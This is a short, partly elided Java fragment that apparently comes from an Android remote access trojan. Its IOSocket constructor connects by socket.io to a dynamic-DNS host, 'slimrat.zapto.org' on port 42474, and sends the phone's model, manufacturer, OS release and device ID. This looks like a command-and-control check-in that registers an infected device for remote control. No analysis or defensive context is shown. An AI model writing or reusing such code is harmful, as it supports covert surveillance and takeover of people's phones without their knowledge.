...
public class IOSocket {
    ...
    private IOSocket() {
        try {
            ...
            ioSocket = IO.socket("http://slimrat.zapto.org:42474?model="+ android.net.Uri.encode(Build.MODEL)+"&manf="+Build.MANUFACTURER+"&release="+Build.VERSION.RELEASE+"&id="+deviceID);
